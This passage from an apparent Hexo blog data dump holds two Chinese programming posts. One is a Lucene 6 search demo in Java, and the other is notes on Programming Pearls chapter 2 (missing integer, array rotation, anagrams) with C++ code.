class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">IndexFiles</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">IndexFiles</span><span class=\"params\">(String indexDestiny, String documentsPath)</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">boolean</span> create = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">\t\t<span class=\"comment\">//******** find the document_path *********//</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Path docDir = Paths.get(documentsPath);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!Files.isReadable(docDir)) &#123;</span><br><span class=\"line\">\t\t\tSystem.out.println(<span class=\"string\">\"Document directory '\"</span> +docDir.toAbsolutePath()+ <span class=\"string\">\"' does not exist or is not readable, please check the path\"</span>);</span><br><span class=\"line\">\t\t\tSystem.exit(<span class=\"number\">1</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tDate start = <span class=\"keyword\">new</span> Date();</span><br><span class=\"line\">\t\t<span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">\t\t\tSystem.out.println(<span class=\"string\">\"Indexing to directory '\"</span> + indexDestiny + <span class=\"string\">\"'...\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tDirectory dir = FSDirectory.open(Paths.get(indexDestiny));      </span><br><span class=\"line\">\t\t\tAnalyzer analyzer = <span class=\"keyword\">new</span> SmartChineseAnalyzer();</span><br><span class=\"line\">\t\t\tIndexWriterConfig iwc = <span class=\"keyword\">new</span> IndexWriterConfig(analyzer);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (create) &#123;</span><br><span class=\"line\">\t\t\t\tiwc.setOpenMode(OpenMode.CREATE);</span><br><span class=\"line\">\t\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t\tiwc.setOpenMode(OpenMode.CREATE_OR_APPEND);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//******** construct an IndexWriter *******//</span></span><br><span class=\"line\">\t\t\tIndexWriter writer = <span class=\"keyword\">new</span> IndexWriter(dir, iwc);</span><br><span class=\"line\">\t\t\tindexDocs(writer, docDir);</span><br><span class=\"line\">\t\t\twriter.close();</span><br><span class=\"line\">\t\t\tDate end = <span class=\"keyword\">new</span> Date();</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//*********** calculate the time **********//</span></span><br><span class=\"line\">\t\t\tSystem.out.println(end.getTime() - start.getTime() + <span class=\"string\">\" total milliseconds\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">\t\t\tSystem.out.println(<span class=\"string\">\" caught a \"</span> + e.getClass() +</span><br><span class=\"line\">\t\t\t\t\t<span class=\"string\">\"\\n with message: \"</span> + e.getMessage());</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">//*********** traverse the file tree ************//</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">indexDocs</span><span class=\"params\">(<span class=\"keyword\">final</span> IndexWriter writer, Path path)</span> <span class=\"keyword\">throws</span> IOException </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (Files.isDirectory(path)) &#123;</span><br><span class=\"line\">\t\t\tFiles.walkFileTree(path, <span class=\"keyword\">new</span> SimpleFileVisitor&lt;Path&gt;() &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"meta\">@Override</span></span><br><span class=\"line\">\t\t\t\t<span class=\"function\"><span class=\"keyword\">public</span> FileVisitResult <span class=\"title\">visitFile</span><span class=\"params\">(Path file, BasicFileAttributes attrs)</span> <span class=\"keyword\">throws</span> IOException </span>&#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">\t\t\t\t\t\tindexDoc(writer, file, attrs.lastModifiedTime().toMillis());</span><br><span class=\"line\">\t\t\t\t\t&#125; <span class=\"keyword\">catch</span> (IOException ignore) &#123;</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">return</span> FileVisitResult.CONTINUE;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;);</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\tindexDoc(writer, path, Files.getLastModifiedTime(path).toMillis());</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">//******** Index single document ********//</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">indexDoc</span><span class=\"params\">(IndexWriter writer, Path file, <span class=\"keyword\">long</span> lastModified)</span> <span class=\"keyword\">throws</span> IOException </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">try</span> (InputStream stream = Files.newInputStream(file)) &#123;</span><br><span class=\"line\">\t\t\tDocument doc = <span class=\"keyword\">new</span> Document();</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//*********** title ************//</span></span><br><span class=\"line\">\t\t\tField titleField = <span class=\"keyword\">new</span> StringField(<span class=\"string\">\"title\"</span>, file.getFileName().toString(), Field.Store.YES);</span><br><span class=\"line\">\t\t\tdoc.add(titleField);</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//************ path ************//</span></span><br><span class=\"line\">\t\t\tField pathField = <span class=\"keyword\">new</span> StringField(<span class=\"string\">\"path\"</span>, file.toString(), Field.Store.YES);</span><br><span class=\"line\">\t\t\tdoc.add(pathField);</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//******* last modify time ******//</span></span><br><span class=\"line\">\t\t\tdoc.add(<span class=\"keyword\">new</span> LongPoint(<span class=\"string\">\"modified\"</span>, lastModified));</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//******** content ********//</span></span><br><span class=\"line\">\t\t\tdoc.add(<span class=\"keyword\">new</span> TextField(<span class=\"string\">\"contents\"</span>, <span class=\"keyword\">new</span> BufferedReader(<span class=\"keyword\">new</span> InputStreamReader(stream, StandardCharsets.UTF_8))));</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (writer.getConfig().getOpenMode() == OpenMode.CREATE) &#123;</span><br><span class=\"line\">\t\t\t\twriter.addDocument(doc);</span><br><span class=\"line\">\t\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t\twriter.updateDocument(<span class=\"keyword\">new</span> Term(<span class=\"string\">\"path\"</span>, file.toString()), doc);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"检索文件\"><a href=\"#检索文件\" class=\"headerlink\" title=\"检索文件\"></a>检索文件</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//*SearchFiles.java*//</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.BufferedReader;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.InputStreamReader;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.charset.StandardCharsets;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Files;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Paths;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Date;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.analysis.Analyzer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.analysis.standard.StandardAnalyzer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.wltea.analyzer.lucene.IKAnalyzer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.analysis.cn.smart.SmartChineseAnalyzer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.document.Document;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.index.DirectoryReader;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.index.IndexReader;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.queryparser.classic.ParseException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.queryparser.classic.QueryParser;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.search.IndexSearcher;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.search.Query;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.search.ScoreDoc;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.search.TopDocs;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.lucene.store.FSDirectory;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SearchFiles</span> </span>&#123;</span><br><span class=\"line\">\tString indexPath;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> repeat = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">boolean</span> raw = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">\tAnalyzer analyzer;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> hitsPerPage = <span class=\"number\">300</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">SearchFiles</span><span class=\"params\">(String indexPath)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>.indexPath = indexPath;</span><br><span class=\"line\">\t\tanalyzer = <span class=\"keyword\">new</span> SmartChineseAnalyzer();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> String[][] query(String time0, String time1, String queryString, String field) <span class=\"keyword\">throws</span> IOException, ParseException&#123;</span><br><span class=\"line\">\t\tIndexReader reader = DirectoryReader.open(FSDirectory.open(Paths.get(indexPath)));</span><br><span class=\"line\">\t\tIndexSearcher searcher = <span class=\"keyword\">new</span> IndexSearcher(reader);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tBufferedReader in = <span class=\"keyword\">new</span> BufferedReader(<span class=\"keyword\">new</span> InputStreamReader(System.in, StandardCharsets.UTF_8));</span><br><span class=\"line\">\t\tQueryParser parser = <span class=\"keyword\">new</span> QueryParser(field, analyzer);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (queryString == <span class=\"keyword\">null</span> || queryString.length() == -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">new</span> Exception(<span class=\"string\">\"查询不能为空!\"</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tqueryString = queryString.trim();</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (queryString.length() == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">new</span> Exception(<span class=\"string\">\"查询不能为空格!\"</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tQuery query = parser.parse(queryString);</span><br><span class=\"line\">\t\tSystem.out.println(<span class=\"string\">\"...Searching for: \"</span> + query.toString(field));</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (repeat &gt; <span class=\"number\">0</span>) &#123;                      <span class=\"comment\">// repeat &amp; time as benchmark</span></span><br><span class=\"line\">\t\t\tDate start = <span class=\"keyword\">new</span> Date();</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; repeat; i++) &#123;</span><br><span class=\"line\">\t\t\t\tsearcher.search(query,<span class=\"number\">100</span>);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\tDate end = <span class=\"keyword\">new</span> Date();</span><br><span class=\"line\">\t\t\tSystem.out.println(<span class=\"string\">\"Time: \"</span>+(end.getTime()-start.getTime())+<span class=\"string\">\"ms\"</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tScoreDoc[] hits = doPagingSearch(in, searcher, query, hitsPerPage, raw, queryString == <span class=\"keyword\">null</span>);</span><br><span class=\"line\">\t\tString[][] result = <span class=\"keyword\">new</span> String[hitsPerPage &gt; hits.length ? hits.length :hitsPerPage][<span class=\"number\">3</span>];</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> index = -<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>; i &lt; hits.length &amp;&amp; index &lt; hitsPerPage-<span class=\"number\">1</span> ;++i) </span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">int</span> docId = hits[i].doc;</span><br><span class=\"line\">\t\t\tDocument d = searcher.doc(docId);</span><br><span class=\"line\">\t\t\tString p = d.get(<span class=\"string\">\"path\"</span>);</span><br><span class=\"line\">\t\t\t<span class=\"comment\">// judge if the doc is to choose</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">boolean</span> fin = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">\t\t\tSystem.out.println(p.charAt(<span class=\"number\">13</span>) +<span class=\"string\">\" \"</span>+ time0.charAt(<span class=\"number\">3</span>) +<span class=\"string\">\" \"</span>+ time1.charAt(<span class=\"number\">3</span>));</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(p.charAt(<span class=\"number\">13</span>)&gt;=time0.charAt(<span class=\"number\">3</span>) &amp;&amp; p.charAt(<span class=\"number\">13</span>)&lt;=time1.charAt(<span class=\"number\">3</span>))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">int</span> tm0 = (time0.charAt(<span class=\"number\">5</span>) - <span class=\"string\">'0'</span>)*<span class=\"number\">10</span> + (time0.charAt(<span class=\"number\">6</span>) - <span class=\"string\">'0'</span>);</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">int</span> tm1 = (time1.charAt(<span class=\"number\">5</span>) - <span class=\"string\">'0'</span>)*<span class=\"number\">10</span> + (time1.charAt(<span class=\"number\">6</span>) - <span class=\"string\">'0'</span>);</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">int</span> m = (p.charAt(<span class=\"number\">15</span>) - <span class=\"string\">'0'</span>)*<span class=\"number\">10</span> + (p.charAt(<span class=\"number\">16</span>) - <span class=\"string\">'0'</span>);</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span>(m &gt;= tm0 &amp;&amp; m &lt;=tm1)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">int</span> td0 = (time0.charAt(<span class=\"number\">8</span>) - <span class=\"string\">'0'</span>)*<span class=\"number\">10</span> + (time0.charAt(<span class=\"number\">9</span>) - <span class=\"string\">'0'</span>);</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">int</span> td1 = (time1.charAt(<span class=\"number\">8</span>) - <span class=\"string\">'0'</span>)*<span class=\"number\">10</span> + (time1.charAt(<span class=\"number\">9</span>) - <span class=\"string\">'0'</span>);</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">int</span> day = (p.charAt(<span class=\"number\">18</span>) - <span class=\"string\">'0'</span>)*<span class=\"number\">10</span> + (p.charAt(<span class=\"number\">19</span>) - <span class=\"string\">'0'</span>);</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span>(tm0 &lt; tm1 &amp;&amp; m == tm0 &amp;&amp; day &gt;= td0) fin = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span>(tm0 &lt; tm1 &amp;&amp; m == tm1 &amp;&amp; day &lt;= td1) fin = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span>(m &gt; tm0 &amp;&amp; m &lt; tm1) fin = <span class=\"keyword\">true</span>; </span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span>(m == tm0 &amp;&amp; m == tm1)</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"keyword\">if</span>(day &gt;= td0 &amp;&amp; day &lt;= td1) fin = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\tSystem.out.println(<span class=\"string\">\"fin: \"</span>+fin); <span class=\"comment\">// for debug use</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(fin)&#123;</span><br><span class=\"line\">\t\t\t\tresult[index+<span class=\"number\">1</span>][<span class=\"number\">0</span>] = <span class=\"string\">\"\"</span>+(index+<span class=\"number\">2</span>);</span><br><span class=\"line\">\t\t\t\tresult[index+<span class=\"number\">1</span>][<span class=\"number\">1</span>] = d.get(<span class=\"string\">\"title\"</span>);</span><br><span class=\"line\">\t\t\t\tresult[index+<span class=\"number\">1</span>][<span class=\"number\">2</span>] = p.substring(<span class=\"number\">10</span>,<span class=\"number\">20</span>);</span><br><span class=\"line\">\t\t\t\tSystem.out.println(d.get(<span class=\"string\">\"path\"</span>)); <span class=\"comment\">// for debug use</span></span><br><span class=\"line\">\t\t\t\tindex += <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\treader.close();</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(index == -<span class=\"number\">1</span>) &#123;<span class=\"keyword\">new</span> Exception(<span class=\"string\">\"查询无果!\"</span>);&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> result;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">private</span> ScoreDoc[] doPagingSearch(BufferedReader in, IndexSearcher searcher, Query query, </span><br><span class=\"line\">\t\t\t<span class=\"keyword\">int</span> hitsPerPage, <span class=\"keyword\">boolean</span> raw, <span class=\"keyword\">boolean</span> interactive) <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// Collect enough docs to show 5 pages</span></span><br><span class=\"line\">\t\tTopDocs results = searcher.search(query, <span class=\"number\">5</span> * hitsPerPage);</span><br><span class=\"line\">\t\tScoreDoc[] hits = results.scoreDocs;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> numTotalHits = results.totalHits;</span><br><span class=\"line\">\t\tSystem.out.println(numTotalHits + <span class=\"string\">\" total matching documents\"</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> hits;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>关键处代码都写有注释，相信有了<a href=\"http://codepub.cn/2016/05/20/Lucene-6-0-in-action-1-Index-creation/\" target=\"_blank\" rel=\"noopener\">代码馆 Lucene6.0实战</a>博文的基础，也不难理解。</p>\n<h3 id=\"运行效果\"><a href=\"#运行效果\" class=\"headerlink\" title=\"运行效果\"></a>运行效果</h3><p><img src=\"/images/in-post/post-blog-Lucene.png\" alt=\"img\"></p>\n<h3 id=\"完整src见Github\"><a href=\"#完整src见Github\" class=\"headerlink\" title=\"完整src见Github\"></a>完整src见<a href=\"https://github.com/miyunluo/Lucene6.1-demo\" target=\"_blank\" rel=\"noopener\">Github</a></h3><p>– miyunluo 于2016.10</p>\n"},{"layout":"post","title":"啊哈！算法","_content":"\n> “字字珠玑”\n\n\n## 前言\n\n书是某github大神推荐的，买了有一段时间了，却一直没看，今天静下心来读一读。\n\n\n---\n\n## 正文\n\n第二章很短，在本章开头提出了三个问题，就在此对这三个问题进行讨论和解决。\n\n### 问题A\n\n> 给定一个最多包含 40亿个随机排列的 32位整数的顺序文件，找出一个不在文件中的 32位整数。（为什么一定有数缺失）<br>在具有足够内存的情况下，如何解决该问题？<br>如果有几个外部的“临时”文件可用，但是仅有几百字节的内存，又该如何解决该问题？\n\n因为40亿小于2的32次方所以一定有数缺失。\n\n#### 1.内存足够\n\n可以使用位图（第一章中有介绍），使用大小为2的32次方除以8字节=512MB的位图来表示出现的整数。\n\n#### 2.内存有限\n\n从整数的二进制表示入手，采用二分搜索。\n\n第一趟需要读入40亿个数，判断每个数最高位是0还是1，将第一位是0的存入一个文件，第一位是1的存入另一个文件。于是将40亿个数分被成了两份，而缺失的数必定会在较小的那一份里面。然后，选取较小的那一份，再按照第二位是否为1，分成两份。依次处理每一位，直到有一个分组的个数为0.\n\n举个例子，设数集是｛1，2，3，4，5，6，7，8，9，10｝，按照第一位是0/1分组得到\n\n    第一位为0: 1，2，3，4，5，6，7（7个数）\n\t第一位为1: 8，9，10（3个数）\n\n第一位为1的数只有3个，小于16/2 ＝ 8，所以缺失的数在第二组，当然第一组也缺失了0.我们选择第二组继续进行分组\n\n    第二位为0: 8，9，10（3个数）\n\t第二位为1:（0个数）\n\n现在我们得到一个分组包含的数字个数为0，于是我们找到了10之后的数字11，12，13，14，15都缺失了。\n\n``` c++\n// a是原始数组，b是当前位为1的数组，c是当前位为0的数组\nint split(int *a, int *b, int *c, int a_len,int bit)\n{\n\tint b_iterator, c_iterator, i;\n\tint v = 0, ans;\n\twhile(bit--){ // bit starts from 31\n\t\tv = (1<<bit);\n\t\tfor(i = b_iterator = c_iterator = 0;i<a_len;++i)\n\t\t{\n\t\t\tif(a[i]>>bit) b[b_iterator ++] = a[i];\n\t\t\telse c[c_iterator ++] = a[i];\n\t\t}\n\t\tif(b_iterator <= c_iterator){\n\t\t\tans += v;\n\t\t\ta = b;\n\t\t\ta_len = b_iterator;\n\t\t}else{\n\t\t\ta = c;\n\t\t\ta_len = c_iterator;\n\t\t}\n\t}\n\treturn ans;\n}\n```\n\n### 问题B\n\n>将一个n元一维向量向左旋转 i 个位置。<br>例如，当 n = 8且 i = 3时，向量 abcdefgh 旋转为 defghabc。\n\n借用书上原话，我们将问题看成是把数组ab转换成ba，同时假定我们拥有一个函数可以将数组中特定部分的元素求逆。从ab开始，首先对a求逆得到a^r b，然后对b求逆得到a^r b^r。最后对整体求逆，得到(a^r b^r)^r,此时就恰好是ba。\n\n\n``` c++\nvoid reverse(int i,int j)\n{\n\tint tmp;\n\twhile(i < j)\n\t{\n\t\ttmp = x[i];\n\t\tx[i] = x[j];\n\t\tx[j] = tmp;\n\t\t++i;--j;\n\t}\n}\n\nvoid rotate(int i, int n)\n{\n\treverse(0,i-1);\n\treverse(i,n-1);\n\treverse(0,n-1);\n}\n```\n这个方法在**时间空间上的效率都很高**，而且思路简单不容易出错。\n\n还有一种运用移位的方法。书上称之为**精巧的杂技动作**。\n\n首先移动x[0]到临时变量t，然后移动x[i]至x[0]，x[2i]至x[i]，依次类推(x中的所有下标对n取模)，直至返回到取x[0]中的元素，此时改为从t取值然后终止过程。如果该过程没有移动全部元素，就从x[1]开始再次进行移动，直到所有的元素都已经移动为止。\n\n``` c++\n//传说中的共(g)产(c)党(d)算法,求最大公约数\nint gcd(int a, int b)\n{\n    if(b == 0) return a;\n    return gcd(b, a % b);\n}\n//num为等待旋转的数组,len为长度,rotdist为位移长度\nvoid rotate(int *nums, int len, int rotdist) {\n    int i;\n    for (i = 0; i < gcd(rotdist, len); i++) {\n        int tmp = nums[i];\n        int j = i;\n        while (true) {\n            int k = (j + rotdist) % len;\n            if (k == i) break;\n            nums[j] = nums[k];\n            j = k;\n        }\n        nums[j] = tmp;\n    }\n}\n```\n\n### 问题C\n\n>给定一个英语词典，找出其中的所有变位词集合。例如，\"pots\"、\"stop\"、\"tops\"互为变位词，因为每一个单词都可以通过改变其他单词中字母的顺序来得到。\n\n我们可以标识字典里的每一个词，使得在相同变位词类中的单词具有相同的标识。然后，将具有相同标识的单词集中在一起。这将原始的变味词问题简化为两个子问题：选择标识和集中具有相同的单词。\n对于第一个问题，我们可以使用基于排序的标识：将单词中的字母表顺序排列。\"deposit\"的标识就是\"deiopst\"，这也是\"dopiest\"和其他任何该类单词的标识。要解决第二个问题，我们将所有的单词按照其标识的顺序排序。\n\n这里用hash table来解决\n\n``` c++\nvector<string> anagram(vector<string>& Strs)\n{\n\tunordered_map<string, vector<int>> map;\n\tvector<string> ans;\n\tint num = Strs.size();\n\tstring tmp;\n\tfor(int i = 0;i<num;++i)\n\t{\n\t\ttmp = Strs[i];\n\t\tsort(tmp.begin(), tmp.end());\n\t\tmap[tmp].push_back(i);\n\t}\n\tfor(auto &m : map)\n\t{\n\t\tint n = m.second.size();\n\t\tif(num > 1)\n\t\t\tfor(int i = 0;i<n;++i)\n\t\t\t\tans.push_back(Strs[m.second[i]]);\n\t}\n\treturn ans;\n}\n\n```\n\n","source":"_posts/2016-10-15-BCZJ2.markdown","raw":"---\nlayout:     post\ntitle:      \"啊哈！算法\"\ntags:\n    - 编程珠玑\n---\n\n> “字字珠玑”\n\n\n## 前言\n\n书是某github大神推荐的，买了有一段时间了，却一直没看，今天静下心来读一读。\n\n\n---\n\n## 正文\n\n第二章很短，在本章开头提出了三个问题，就在此对这三个问题进行讨论和解决。\n\n### 问题A\n\n> 给定一个最多包含 40亿个随机排列的 32位整数的顺序文件，找出一个不在文件中的 32位整数。（为什么一定有数缺失）<br>在具有足够内存的情况下，如何解决该问题？<br>如果有几个外部的“临时”文件可用，但是仅有几百字节的内存，又该如何解决该问题？\n\n因为40亿小于2的32次方所以一定有数缺失。\n\n#### 1.内存足够\n\n可以使用位图（第一章中有介绍），使用大小为2的32次方除以8字节=512MB的位图来表示出现的整数。\n\n#### 